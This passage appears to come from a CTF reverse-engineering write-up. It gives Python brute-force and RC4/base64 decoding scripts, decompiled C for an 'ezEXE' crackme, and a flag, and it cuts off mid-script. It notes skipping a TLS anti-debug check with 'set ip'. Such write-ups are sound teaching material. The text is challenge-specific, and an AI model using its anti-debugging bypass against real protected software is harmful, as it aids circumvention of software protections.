<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line">flag = <span class="string">&quot;111111111111111&quot;</span></span><br><span class="line">a = [<span class="number">0</span>] * <span class="built_in">len</span>(flag)</span><br><span class="line">che = [<span class="number">0x66</span>, <span class="number">0x6C</span>, <span class="number">0x61</span>, <span class="number">0x67</span>, <span class="number">0x7B</span>, <span class="number">0x77</span>, <span class="number">0x68</span>, <span class="number">0x65</span>, <span class="number">0x72</span>, <span class="number">0x65</span>, <span class="number">0x20</span>, <span class="number">0x69</span>, <span class="number">0x73</span>, <span class="number">0x20</span>, <span class="number">0x74</span>, <span class="number">0x6F</span>, <span class="number">0x6D</span>, <span class="number">0x7D</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x66</span>, <span class="number">0x6C</span>, <span class="number">0x61</span>, <span class="number">0x67</span>, <span class="number">0x7B</span>, <span class="number">0x4D</span>, <span class="number">0x79</span>, <span class="number">0x20</span>, <span class="number">0x63</span>, <span class="number">0x68</span>, <span class="number">0x65</span>, <span class="number">0x65</span>, <span class="number">0x73</span>, <span class="number">0x65</span>, <span class="number">0x7D</span>, <span class="number">0x00</span>, <span class="number">0x66</span>, <span class="number">0x6C</span>, <span class="number">0x61</span>, <span class="number">0x67</span>, <span class="number">0x7B</span>, <span class="number">0x69</span>, <span class="number">0x20</span>, <span class="number">0x6D</span>, <span class="number">0x69</span>, <span class="number">0x73</span>, <span class="number">0x73</span>, <span class="number">0x20</span>, <span class="number">0x74</span>, <span class="number">0x6F</span>, <span class="number">0x6D</span>, <span class="number">0x7D</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x66</span>, <span class="number">0x6C</span>, <span class="number">0x61</span>, <span class="number">0x67</span>, <span class="number">0x7B</span>, <span class="number">0x6C</span>, <span class="number">0x65</span>, <span class="number">0x74</span>, <span class="number">0x27</span>, <span class="number">0x73</span>, <span class="number">0x20</span>, <span class="number">0x68</span>, <span class="number">0x61</span>, <span class="number">0x76</span>, <span class="number">0x65</span>, <span class="number">0x20</span>, <span class="number">0x61</span>, <span class="number">0x20</span>, <span class="number">0x66</span>, <span class="number">0x75</span>, <span class="number">0x6E</span>, <span class="number">0x7D</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x66</span>, <span class="number">0x6C</span>, <span class="number">0x61</span>, <span class="number">0x67</span>, <span class="number">0x7B</span>, <span class="number">0x75</span>, <span class="number">0x20</span>, <span class="number">0x77</span>, <span class="number">0x61</span>, <span class="number">0x6E</span>, <span class="number">0x74</span>, <span class="number">0x20</span>, <span class="number">0x73</span>, <span class="number">0x74</span>, <span class="number">0x65</span>, <span class="number">0x61</span>, <span class="number">0x6C</span>, <span class="number">0x20</span>, <span class="number">0x6D</span>, <span class="number">0x79</span>, <span class="number">0x20</span>, <span class="number">0x63</span>, <span class="number">0x68</span>, <span class="number">0x65</span>, <span class="number">0x65</span>, <span class="number">0x73</span>, <span class="number">0x65</span>, <span class="number">0x7D</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x66</span>, <span class="number">0x6C</span>, <span class="number">0x61</span>, <span class="number">0x67</span>, <span class="number">0x7B</span>, <span class="number">0x69</span>, <span class="number">0x20</span>, <span class="number">0x68</span>, <span class="number">0x61</span>, <span class="number">0x76</span>, <span class="number">0x65</span>, <span class="number">0x64</span>, <span class="number">0x20</span>, <span class="number">0x6C</span>, <span class="number">0x6F</span>, <span class="number">0x73</span>, <span class="number">0x74</span>, <span class="number">0x20</span>, <span class="number">0x61</span>, <span class="number">0x20</span>, <span class="number">0x63</span>, <span class="number">0x68</span>, <span class="number">0x65</span>, <span class="number">0x65</span>, <span class="number">0x73</span>, <span class="number">0x65</span>, <span class="number">0x7D</span>, <span class="number">0x00</span>, <span class="number">0x66</span>, <span class="number">0x6C</span>, <span class="number">0x61</span>, <span class="number">0x67</span>, <span class="number">0x7B</span>, <span class="number">0x63</span>, <span class="number">0x68</span>, <span class="number">0x65</span>, <span class="number">0x65</span>, <span class="number">0x73</span>, <span class="number">0x65</span>, <span class="number">0x20</span>, <span class="number">0x69</span>, <span class="number">0x73</span>, <span class="number">0x20</span>, <span class="number">0x6D</span>, <span class="number">0x79</span>, <span class="number">0x20</span>, <span class="number">0x6C</span>, <span class="number">0x69</span>, <span class="number">0x66</span>, <span class="number">0x65</span>, <span class="number">0x7D</span>, <span class="number">0x00</span>, <span class="number">0x66</span>, <span class="number">0x6C</span>, <span class="number">0x61</span>, <span class="number">0x67</span>, <span class="number">0x7B</span>, <span class="number">0x77</span>, <span class="number">0x68</span>, <span class="number">0x61</span>, <span class="number">0x74</span>, <span class="number">0x20</span>, <span class="number">0x64</span>, <span class="number">0x69</span>, <span class="number">0x64</span>, <span class="number">0x20</span>, <span class="number">0x79</span>, <span class="number">0x6F</span>, <span class="number">0x75</span>, <span class="number">0x20</span>, <span class="number">0x68</span>, <span class="number">0x61</span>, <span class="number">0x76</span>, <span class="number">0x65</span>, <span class="number">0x20</span>, <span class="number">0x66</span>, <span class="number">0x6F</span>, <span class="number">0x72</span>, <span class="number">0x20</span>, <span class="number">0x62</span>, <span class="number">0x72</span>, <span class="number">0x65</span>, <span class="number">0x61</span>, <span class="number">0x6B</span>, <span class="number">0x66</span>, <span class="number">0x61</span>, <span class="number">0x73</span>, <span class="number">0x74</span>, <span class="number">0x7D</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x66</span>, <span class="number">0x6C</span>, <span class="number">0x61</span>, <span class="number">0x67</span>, <span class="number">0x7B</span>, <span class="number">0x6C</span>, <span class="number">0x65</span>, <span class="number">0x74</span>, <span class="number">0x27</span>, <span class="number">0x73</span>, <span class="number">0x20</span>, <span class="number">0x68</span>, <span class="number">0x61</span>, <span class="number">0x76</span>, <span class="number">0x65</span>, <span class="number">0x20</span>, <span class="number">0x61</span>, <span class="number">0x20</span>, <span class="number">0x64</span>, <span class="number">0x61</span>, <span class="number">0x6E</span>, <span class="number">0x63</span>, <span class="number">0x69</span>, <span class="number">0x6E</span>, <span class="number">0x67</span>, <span class="number">0x7D</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x66</span>, <span class="number">0x6C</span>, <span class="number">0x61</span>, <span class="number">0x67</span>, <span class="number">0x7B</span>, <span class="number">0x63</span>, <span class="number">0x61</span>, <span class="number">0x6E</span>, <span class="number">0x20</span>, <span class="number">0x75</span>, <span class="number">0x20</span>, <span class="number">0x70</span>, <span class="number">0x6C</span>, <span class="number">0x61</span>, <span class="number">0x79</span>, <span class="number">0x20</span>, <span class="number">0x74</span>, <span class="number">0x68</span>, <span class="number">0x65</span>, <span class="number">0x20</span>, <span class="number">0x70</span>, <span class="number">0x69</span>, <span class="number">0x61</span>, <span class="number">0x6E</span>, <span class="number">0x6F</span>, <span class="number">0x20</span>, <span class="number">0x66</span>, <span class="number">0x6F</span>, <span class="number">0x72</span>, <span class="number">0x20</span>, <span class="number">0x6D</span>, <span class="number">0x65</span>, <span class="number">0x7D</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x66</span>, <span class="number">0x6C</span>, <span class="number">0x61</span>, <span class="number">0x67</span>, <span class="number">0x7B</span>, <span class="number">0x69</span>, <span class="number">0x20</span>, <span class="number">0x68</span>, <span class="number">0x61</span>, <span class="number">0x76</span>, <span class="number">0x65</span>, <span class="number">0x20</span>, <span class="number">0x61</span>, <span class="number">0x20</span>, <span class="number">0x67</span>, <span class="number">0x72</span>, <span class="number">0x65</span>, <span class="number">0x61</span>, <span class="number">0x74</span>, <span class="number">0x20</span>, <span class="number">0x64</span>, <span class="number">0x72</span>, <span class="number">0x65</span>, <span class="number">0x61</span>, <span class="number">0x6D</span>, <span class="number">0x7D</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x66</span>, <span class="number">0x6C</span>, <span class="number">0x61</span>, <span class="number">0x67</span>, <span class="number">0x7B</span>, <span class="number">0x69</span>, <span class="number">0x20</span>, <span class="number">0x77</span>, <span class="number">0x61</span>, <span class="number">0x6E</span>, <span class="number">0x74</span>, <span class="number">0x20</span>, <span class="number">0x67</span>, <span class="number">0x6F</span>, <span class="number">0x20</span>, <span class="number">0x74</span>, <span class="number">0x6F</span>, <span class="number">0x20</span>, <span class="number">0x74</span>, <span class="number">0x68</span>, <span class="number">0x65</span>, <span class="number">0x20</span>, <span class="number">0x53</span>, <span class="number">0x6F</span>, <span class="number">0x75</span>, <span class="number">0x74</span>, <span class="number">0x68</span>, <span class="number">0x20</span>, <span class="number">0x50</span>, <span class="number">0x6F</span>, <span class="number">0x6C</span>, <span class="number">0x65</span>, <span class="number">0x7D</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x66</span>, <span class="number">0x6C</span>, <span class="number">0x61</span>, <span class="number">0x67</span>, <span class="number">0x7B</span>, <span class="number">0x6C</span>, <span class="number">0x65</span>, <span class="number">0x74</span>, <span class="number">0x27</span>, <span class="number">0x73</span>, <span class="number">0x20</span>, <span class="number">0x68</span>, <span class="number">0x61</span>, <span class="number">0x76</span>, <span class="number">0x65</span>, <span class="number">0x20</span>, <span class="number">0x61</span>, <span class="number">0x20</span>, <span class="number">0x66</span>, <span class="number">0x69</span>, <span class="number">0x67</span>, <span class="number">0x68</span>, <span class="number">0x74</span>, <span class="number">0x7D</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x66</span>, <span class="number">0x6C</span>, <span class="number">0x61</span>, <span class="number">0x67</span>, <span class="number">0x7B</span>, <span class="number">0x69</span>, <span class="number">0x27</span>, <span class="number">0x6D</span>, <span class="number">0x20</span>, <span class="number">0x77</span>, <span class="number">0x6F</span>, <span class="number">0x72</span>, <span class="number">0x6B</span>, <span class="number">0x69</span>, <span class="number">0x6E</span>, <span class="number">0x67</span>, <span class="number">0x20</span>, <span class="number">0x6F</span>, <span class="number">0x6E</span>, <span class="number">0x20</span>, <span class="number">0x61</span>, <span class="number">0x6E</span>, <span class="number">0x20</span>, <span class="number">0x61</span>, <span class="number">0x6E</span>, <span class="number">0x74</span>, <span class="number">0x69</span>, <span class="number">0x2D</span>, <span class="number">0x48</span>, <span class="number">0x75</span>, <span class="number">0x6C</span>, <span class="number">0x6B</span>, <span class="number">0x20</span>, <span class="number">0x61</span>, <span class="number">0x72</span>, <span class="number">0x6D</span>, <span class="number">0x6F</span>, <span class="number">0x72</span>, <span class="number">0x20</span>, <span class="number">0x7D</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x66</span>, <span class="number">0x6C</span>, <span class="number">0x61</span>, <span class="number">0x67</span>, <span class="number">0x7B</span>, <span class="number">0x69</span>, <span class="number">0x20</span>, <span class="number">0x6B</span>, <span class="number">0x6E</span>, <span class="number">0x65</span>, <span class="number">0x77</span>, <span class="number">0x20</span>, <span class="number">0x74</span>, <span class="number">0x6F</span>, <span class="number">0x6D</span>, <span class="number">0x20</span>, <span class="number">0x77</span>, <span class="number">0x61</span>, <span class="number">0x73</span>, <span class="number">0x20</span>, <span class="number">0x67</span>, <span class="number">0x6F</span>, <span class="number">0x69</span>, <span class="number">0x6E</span>, <span class="number">0x67</span>, <span class="number">0x20</span>, <span class="number">0x74</span>, <span class="number">0x6F</span>, <span class="number">0x20</span>, <span class="number">0x61</span>, <span class="number">0x74</span>, <span class="number">0x74</span>, <span class="number">0x61</span>, <span class="number">0x63</span>, <span class="number">0x6B</span>, <span class="number">0x20</span>, <span class="number">0x6D</span>, <span class="number">0x65</span>, <span class="number">0x20</span>, <span class="number">0x74</span>, <span class="number">0x6F</span>, <span class="number">0x6E</span>, <span class="number">0x69</span>, <span class="number">0x67</span>, <span class="number">0x68</span>, <span class="number">0x74</span>, <span class="number">0x7D</span>, <span class="number">0x00</span>, <span class="number">0x66</span>, <span class="number">0x6C</span>, <span class="number">0x61</span>, <span class="number">0x67</span>, <span class="number">0x7B</span>, <span class="number">0x69</span>, <span class="number">0x27</span>, <span class="number">0x76</span>, <span class="number">0x65</span>, <span class="number">0x20</span>, <span class="number">0x61</span>, <span class="number">0x6C</span>, <span class="number">0x72</span>, <span class="number">0x65</span>, <span class="number">0x61</span>, <span class="number">0x64</span>, <span class="number">0x79</span>, <span class="number">0x20</span>, <span class="number">0x66</span>, <span class="number">0x69</span>, <span class="number">0x67</span>, <span class="number">0x75</span>, <span class="number">0x72</span>, <span class="number">0x65</span>, <span class="number">0x64</span>, <span class="number">0x20</span>, <span class="number">0x6F</span>, <span class="number">0x75</span>, <span class="number">0x74</span>, <span class="number">0x20</span>, <span class="number">0x77</span>, <span class="number">0x68</span>, <span class="number">0x61</span>, <span class="number">0x74</span>, <span class="number">0x20</span>, <span class="number">0x74</span>, <span class="number">0x6F</span>, <span class="number">0x20</span>, <span class="number">0x64</span>, <span class="number">0x6F</span>, <span class="number">0x7D</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x66</span>, <span class="number">0x6C</span>, <span class="number">0x61</span>, <span class="number">0x67</span>, <span class="number">0x7B</span>, <span class="number">0x6E</span>, <span class="number">0x6F</span>, <span class="number">0x74</span>, <span class="number">0x20</span>, <span class="number">0x64</span>, <span class="number">0x72</span>, <span class="number">0x75</span>, <span class="number">0x6E</span>, <span class="number">0x6B</span>, <span class="number">0x20</span>, <span class="number">0x6E</span>, <span class="number">0x6F</span>, <span class="number">0x20</span>, <span class="number">0x72</span>, <span class="number">0x65</span>, <span class="number">0x74</span>, <span class="number">0x75</span>, <span class="number">0x72</span>, <span class="number">0x6E</span>, <span class="number">0x7D</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x66</span>, <span class="number">0x6C</span>, <span class="number">0x61</span>, <span class="number">0x67</span>, <span class="number">0x7B</span>, <span class="number">0x6F</span>, <span class="number">0x68</span>, <span class="number">0x21</span>, <span class="number">0x21</span>, <span class="number">0x21</span>, <span class="number">0x21</span>, <span class="number">0x21</span>, <span class="number">0x21</span>, <span class="number">0x6F</span>, <span class="number">0x68</span>, <span class="number">0x7D</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x66</span>, <span class="number">0x6C</span>, <span class="number">0x61</span>, <span class="number">0x67</span>, <span class="number">0x7B</span>, <span class="number">0x69</span>, <span class="number">0x20</span>, <span class="number">0x62</span>, <span class="number">0x65</span>, <span class="number">0x74</span>, <span class="number">0x20</span>, <span class="number">0x69</span>, <span class="number">0x74</span>, <span class="number">0x20</span>, <span class="number">0x77</span>, <span class="number">0x69</span>, <span class="number">0x6C</span>, <span class="number">0x6C</span>, <span class="number">0x20</span>, <span class="number">0x72</span>, <span class="number">0x61</span>, <span class="number">0x69</span>, <span class="number">0x6E</span>, <span class="number">0x20</span>, <span class="number">0x74</span>, <span class="number">0x6F</span>, <span class="number">0x6D</span>, <span class="number">0x6F</span>, <span class="number">0x72</span>, <span class="number">0x72</span>, <span class="number">0x6F</span>, <span class="number">0x77</span>, <span class="number">0x7D</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x66</span>, <span class="number">0x6C</span>, <span class="number">0x61</span>, <span class="number">0x67</span>, <span class="number">0x7B</span>, <span class="number">0x74</span>, <span class="number">0x6F</span>, <span class="number">0x6D</span>, <span class="number">0x20</span>, <span class="number">0x74</span>, <span class="number">0x6F</span>, <span class="number">0x6C</span>, <span class="number">0x64</span>, <span class="number">0x20</span>, <span class="number">0x6D</span>, <span class="number">0x65</span>, <span class="number">0x20</span>, <span class="number">0x74</span>, <span class="number">0x68</span>, <span class="number">0x61</span>, <span class="number">0x74</span>, <span class="number">0x20</span>, <span class="number">0x68</span>, <span class="number">0x65</span>, <span class="number">0x20</span>, <span class="number">0x77</span>, <span class="number">0x61</span>, <span class="number">0x73</span>, <span class="number">0x20</span>, <span class="number">0x61</span>, <span class="number">0x63</span>, <span class="number">0x74</span>, <span class="number">0x75</span>, <span class="number">0x61</span>, <span class="number">0x6C</span>, <span class="number">0x6C</span>, <span class="number">0x79</span>, <span class="number">0x20</span>, <span class="number">0x61</span>, <span class="number">0x20</span>, <span class="number">0x74</span>, <span class="number">0x69</span>, <span class="number">0x67</span>, <span class="number">0x65</span>, <span class="number">0x72</span>, <span class="number">0x7D</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(flag)):</span><br><span class="line">    a[i] = <span class="built_in">ord</span>(flag[i]) ^ <span class="number">0x4</span></span><br><span class="line">    <span class="keyword">if</span> i % <span class="number">3</span> == <span class="number">1</span>:</span><br><span class="line">        a[i] ^= che[i * <span class="number">3</span>]</span><br><span class="line">b = <span class="string">&quot;e4bdtRV02&quot;</span></span><br><span class="line">a1 = a <span class="comment">#key</span></span><br><span class="line">a2 = b <span class="comment">#flag</span></span><br><span class="line">v3 = [<span class="number">0</span>] * <span class="number">15</span></span><br><span class="line">cmp = [<span class="number">0xD3</span>, <span class="number">0x38</span>, <span class="number">0xD1</span>, <span class="number">0xD3</span>, <span class="number">0x7B</span>, <span class="number">0xAD</span>, <span class="number">0xB3</span>, <span class="number">0x66</span>, <span class="number">0x71</span>, <span class="number">0x3A</span>, <span class="number">0x59</span>, <span class="number">0x5F</span>, <span class="number">0x5F</span>, <span class="number">0x2D</span>, <span class="number">0x73</span>]</span><br><span class="line">cmp2 = [ <span class="number">0x3A</span>, <span class="number">0x59</span>, <span class="number">0x5F</span>, <span class="number">0x5F</span>, <span class="number">0x2D</span>, <span class="number">0x73</span>]</span><br><span class="line">flag1 = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">15</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">0xff</span>):</span><br><span class="line">        <span class="keyword">if</span> i % <span class="number">3</span> == <span class="number">0</span>:</span><br><span class="line">            v7 = <span class="number">10</span></span><br><span class="line">        <span class="keyword">elif</span> i%<span class="number">3</span> == <span class="number">1</span>:</span><br><span class="line">            v7 = <span class="number">9</span></span><br><span class="line">        <span class="keyword">elif</span> i %<span class="number">3</span> == <span class="number">2</span>:</span><br><span class="line">            v7 = <span class="number">8</span></span><br><span class="line">        v5 = (v7 + <span class="number">2</span>) ^ j</span><br><span class="line">        <span class="keyword">if</span> i &gt;= <span class="built_in">len</span>(b):</span><br><span class="line">            v8 = <span class="number">0</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            v8 = <span class="built_in">ord</span>(b[i])</span><br><span class="line">        v3[i] = v8 + v5</span><br><span class="line">        <span class="keyword">if</span> cmp[i] == v3[i]:</span><br><span class="line">            <span class="built_in">print</span>(j)      </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(v3)):</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">hex</span>(v3[i]),end = <span class="string">&quot;,&quot;</span>)</span><br><span class="line">flag1 = <span class="string">&quot;&quot;</span></span><br><span class="line">x = [<span class="number">98</span>,</span><br><span class="line"><span class="number">15</span>,</span><br><span class="line"><span class="number">101</span>,</span><br><span class="line"><span class="number">99</span>,</span><br><span class="line"><span class="number">12</span>,</span><br><span class="line"><span class="number">81</span>,</span><br><span class="line"><span class="number">81</span>,</span><br><span class="line"><span class="number">61</span>,</span><br><span class="line"><span class="number">53</span>,</span><br><span class="line"><span class="number">54</span>,</span><br><span class="line"><span class="number">82</span>,</span><br><span class="line"><span class="number">85</span>,</span><br><span class="line"><span class="number">83</span>,</span><br><span class="line"><span class="number">38</span>,</span><br><span class="line"><span class="number">121</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(x)):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">27</span>,<span class="number">127</span>):</span><br><span class="line">        vv = j ^ <span class="number">0x4</span></span><br><span class="line">        <span class="keyword">if</span> i % <span class="number">3</span> == <span class="number">1</span>:</span><br><span class="line">            vv ^= che[i * <span class="number">3</span>]</span><br><span class="line">        <span class="keyword">if</span> vv == x[i]:</span><br><span class="line">            flag1 += <span class="built_in">chr</span>(j)</span><br><span class="line"><span class="built_in">print</span>(flag1)</span><br><span class="line"><span class="comment">#flag&#123;UUU123QWE&#125;</span></span><br></pre></td></tr></table></figure>

<h2 id="ezEXE"><a href="#ezEXE" class="headerlink" title="ezEXE"></a>ezEXE</h2><p>主要加密在：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">int</span> __cdecl sub_40179A(char *a1)</span><br><span class="line">&#123;</span><br><span class="line">  char v2[<span class="number">117</span>]; // [esp+2Ah] [ebp-9Eh] BYREF</span><br><span class="line">  char Str[<span class="number">17</span>]; // [esp+9Fh] [ebp-29h] BYREF</span><br><span class="line">  <span class="built_in">int</span> v4; // [esp+B0h] [ebp-18h]</span><br><span class="line">  size_t v5; // [esp+B4h] [ebp-14h]</span><br><span class="line">  size_t v6; // [esp+B8h] [ebp-10h]</span><br><span class="line">  size_t i; // [esp+BCh] [ebp-Ch]</span><br><span class="line"></span><br><span class="line">  strcpy(Str, <span class="string">&quot;VrDQ-ffgaEig04qx&quot;</span>);</span><br><span class="line">  v6 = strlen(Str);</span><br><span class="line">  v5 = strlen(a1);</span><br><span class="line">  strcpy(v2, <span class="string">&quot;RQpxxZgUqxzwonBuDApb3PyRJ8CcLIyXVozsVjurmPQdUdND+cly4HFq&quot;</span>);</span><br><span class="line">  sub_4016EB(lpAddress, <span class="number">494</span>, <span class="number">5</span>);</span><br><span class="line">  ((void (__cdecl *)(char *, size_t, char *, size_t, char *))lpAddress)(Str, v6, a1, v5, &amp;v2[<span class="number">57</span>]);</span><br><span class="line">  v4 = sub_401535(&amp;v2[<span class="number">57</span>], v5 + <span class="number">1</span>);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; strlen(v2); ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( *(_BYTE *)(i + v4) != v2[i] )</span><br><span class="line">    &#123;</span><br><span class="line">      printf(&amp;Format);</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  printf(&amp;byte_404005);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>又是smc，tls里有反调试，可以用set ip跳过，找到smc的加密。发现是rc4，所以加密就是rc4+base64</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">base = <span class="string">&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&#x27;</span></span><br><span class="line">diy_base = <span class="string">&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&#x27;</span></span><br><span class="line">s = <span class="string">&#x27;RQpxxZgUqxzwonBuDApb3PyRJ8CcLIyXVozsVjurmPQdUdND+cly4HFq==&#x27;</span></span><br><span class="line">ss = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(s)-<span class="number">2</span>):</span><br><span class="line">	ss += base[diy_base.find(s[i])]</span><br><span class="line">ss += <span class="string">&#x27;==&#x27;</span></span><br><span class="line">a = base64.b64decode(ss)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">list</span>(<span class="built_in">map</span>(<span class="built_in">hex</span>,a)))</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rc4_main</span>(<span class="params">key = <span class="string">&quot;init_key&quot;</span>, message = <span class="string">&quot;init_message&quot;</span></span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;RC4解密主函数调用成功&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">    s_box = rc4_init_sbox(key)</span><br><span class="line">    crypt = rc4_excrypt(message, s_box)</span><br><span class="line">    <span class="keyword">return</span> crypt</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rc4_init_sbox</span>(<span class="params">key</span>):</span><br><span class="line">    s_box = <span class="built_in">list</span>(<span class="built_in">range</span>(<span class="number">256</span>))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;原来的 s 盒：%s&quot;</span> % s_box)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">    j = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">        j = (j + s_box[i] + <span class="built_in">ord</span>(key[i % <span class="built_in">len</span>(key)])) % <span class="number">256</span></span><br><span class="line">        s_box[i], s_box[j] = s_box[j], s_box[i]</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;混乱后的 s 盒：%s&quot;</span>% s_box)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> s_box</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rc4_excrypt</span>(<span class="params">plain, box</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;调用解密程序成功。&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">    plain = base64.b64decode(plain.encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">    plain = <span class="built_in">bytes</span>.decode(plain)</span><br><span class="line">    res = []</span><br><span class="line">    i = j = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> s <span class="keyword">in</span> plain:</span><br><span class="line">        i = (i + 